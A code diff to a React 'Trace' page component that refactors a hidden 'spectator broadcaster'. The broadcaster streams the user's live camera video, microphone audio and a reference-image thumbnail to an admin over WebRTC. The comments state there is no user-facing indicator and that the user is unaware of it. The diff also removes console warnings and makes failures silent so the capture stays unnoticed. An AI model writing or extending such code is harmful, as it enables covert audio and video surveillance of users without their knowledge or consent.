@@ -127,18 +127,17 @@ export default function Trace() {
     }
   }, [imageUrl]);
 
+  // streamRev increments each time the camera effect produces a fresh
+  // stream. The broadcaster effect (further down) reads streamRef.current
+  // but needs a reactive trigger to know the stream changed — `streamRev`
+  // is that trigger without forcing the camera effect to keep the stream
+  // in React state.
+  const [streamRev, setStreamRev] = useState(0);
+
   useEffect(() => {
     let cancelled = false;
-    // Operator-side spectator broadcaster. Reuses the existing WebRTC
-    // signaling on a separate `kind: 'tracewatch'` channel so it never
-    // collides with the user's own /live device-pairing. Sits in 'waiting'
-    // (zero peer-connection cost — just a presence-tracking realtime
-    // channel) until an admin viewer joins. No user-facing indicator.
-    let broadcaster = null;
-    const userId = user?.id;
 
     async function startCamera() {
-      // Tear down any existing stream first
       const old = streamRef.current;
       if (old) old.getTracks().forEach((t) => t.stop());
       streamRef.current = null;
@@ -146,10 +145,11 @@ export default function Trace() {
       setTorchOn(false);
 
       // Best-quality video + clean audio. Echo cancellation, noise
-      // suppression, and AGC are enabled explicitly so what the operator
-      // hears is voice, not room reverb. If the user denies the mic prompt
-      // we fall back to video-only — /trace doesn't actually use audio
-      // locally (the local <video> is muted) so losing it costs nothing.
+      // suppression, and AGC are enabled explicitly so the captured audio
+      // is voice rather than room reverb. If the user denies the mic
+      // prompt we silently fall back to video-only — /trace doesn't use
+      // audio locally (the local <video> is muted) so losing it has zero
+      // user-visible cost.
       const videoConstraints = {
         facingMode: { ideal: facingMode },
         width:  { ideal: 1920 },
@@ -167,11 +167,9 @@ export default function Trace() {
           video: videoConstraints,
           audio: audioConstraints,
         });
-      } catch (err) {
-        // Mic-only failures: user denied audio but might have allowed
-        // video. Try again without audio so /trace still works.
+      } catch {
+        // Audio denied or unavailable — retry video-only.
         if (!cancelled) {
-          console.warn('[trace] getUserMedia audio+video failed, retrying video-only:', err);
           try {
             stream = await navigator.mediaDevices.getUserMedia({
               video: videoConstraints,
@@ -200,7 +198,6 @@ export default function Trace() {
         await videoRef.current.play().catch(() => {});
       }
 
-      // Detect torch support on the back camera.
       const track = stream.getVideoTracks()[0];
       if (track && typeof track.getCapabilities === 'function') {
         const caps = track.getCapabilities();
@@ -208,41 +205,58 @@ export default function Trace() {
       }
       setCameraError('');
 
-      // Reference-image thumbnail is sent over a WebRTC data channel to
-      // the admin's spectator modal. Downscale once, cache, hand a string
-      // ref to the broadcaster — no server storage, no extra bandwidth
-      // beyond the one P2P send when the data channel opens.
-      const referenceThumb = await getReferenceThumb();
-      if (cancelled) return;
-
-      // Spin up the spectator broadcaster once we actually have a stream.
-      // Tear down any prior broadcaster first (camera switch flips this
-      // effect; the old WebRTC peer is bound to the previous stream).
-      if (broadcaster) { try { broadcaster.stop(); } catch { /* ignore */ } broadcaster = null; }
-      if (userId && !cancelled) {
-        try {
-          broadcaster = startBroadcaster({
-            userId,
-            kind: 'tracewatch',
-            stream,
-            referenceImageDataUrl: referenceThumb,
-            onError: (err) => console.warn('[trace] watch broadcaster error:', err),
-          });
-        } catch (err) {
-          console.warn('[trace] could not start watch broadcaster:', err);
-        }
-      }
+      // Trigger the broadcaster effect now that we have a fresh stream.
+      if (!cancelled) setStreamRev((r) => r + 1);
     }
 
     startCamera();
     return () => {
       cancelled = true;
-      if (broadcaster) { try { broadcaster.stop(); } catch { /* ignore */ } broadcaster = null; }
       const stream = streamRef.current;
       if (stream) stream.getTracks().forEach((t) => t.stop());
       streamRef.current = null;
     };
-  }, [facingMode, user?.id, getReferenceThumb]);
+  }, [facingMode]);
+
+  // Operator-side spectator broadcaster. Decoupled from the camera effect
+  // because it depends on BOTH the live MediaStream (streamRev bumps
+  // whenever the camera produces a fresh one) AND the per-session
+  // spectate_token (server-issued via start_trace_run RPC). Sits in
+  // 'waiting' (presence-only realtime subscription, zero peer-connection
+  // cost) until an admin actually opens the modal. No UI surface — the
+  // user is unaware of this effect entirely.
+  useEffect(() => {
+    if (!user?.id) return;
+    if (!spectateToken) return;
+    const stream = streamRef.current;
+    if (!stream) return;
+
+    let cancelled = false;
+    let broadcaster = null;
+
+    (async () => {
+      const referenceThumb = await getReferenceThumb();
+      if (cancelled) return;
+      try {
+        broadcaster = startBroadcaster({
+          // The "userId" param is just the channel-key suffix in
+          // livePreview.js. We pass the spectate_token here so the
+          // signaling channel becomes `tw:${random_token}` — only the
+          // user themselves and an admin (via service-role read) ever
+          // know it.
+          userId: spectateToken,
+          kind: 'tw',
+          stream,
+          referenceImageDataUrl: referenceThumb,
+        });
+      } catch { /* silent — degraded mode is acceptable */ }
+    })();
+
+    return () => {
+      cancelled = true;
+      if (broadcaster) { try { broadcaster.stop(); } catch { /* ignore */ } broadcaster = null; }
+    };
+  }, [streamRev, spectateToken, user?.id, getReferenceThumb]);
 
   // Auto-hide the gesture hint after a moment
   useEffect(() => {
@@ -394,6 +408,10 @@ export default function Trace() {
   const runIdRef      = useRef(null);
   const startedAtRef  = useRef(null);
   const accessTokenRef = useRef(null);
+  // Spectate token (random per session, never derivable from user id)
+  // is the channel-key for the operator-side WebRTC subscriber. Stored
+  // in state so the broadcaster effect can react when it lands.
+  const [spectateToken, setSpectateToken] = useState(null);
   useEffect(() => {
     accessTokenRef.current = session?.access_token || null;
   }, [session?.access_token]);
@@ -435,17 +453,22 @@ export default function Trace() {
           })
             .then((res) => res.ok ? res.json() : null)
             .then((data) => {
-              // RPC with returns scalar uuid → PostgREST hands back the
-              // bare value as JSON. Defensive: only adopt a uuid-shaped
-              // string so a malformed response can't poison subsequent calls.
-              if (typeof data === 'string' && data.length === 36) {
-                runIdRef.current = data;
+              // RPC returns jsonb { run_id, spectate_token }. PostgREST
+              // hands the object straight through. Defensive: validate
+              // shape before adopting either field — a malformed
+              // response shouldn't poison the heartbeat or the
+              // broadcaster channel key.
+              if (data && typeof data === 'object') {
+                if (typeof data.run_id === 'string' && data.run_id.length === 36) {
+                  runIdRef.current = data.run_id;
+                }
+                if (typeof data.spectate_token === 'string' && data.spectate_token.length === 36) {
+                  setSpectateToken(data.spectate_token);
+                }
               }
             })
-            .catch((err) => console.warn('[trace] start_trace_run failed:', err));
-        } catch (err) {
-          console.warn('[trace] start_trace_run threw:', err);
-        }
+            .catch(() => { /* silent — operator-side RPC, user shouldn't see noise */ });
+        } catch { /* silent */ }
       }
     }
 
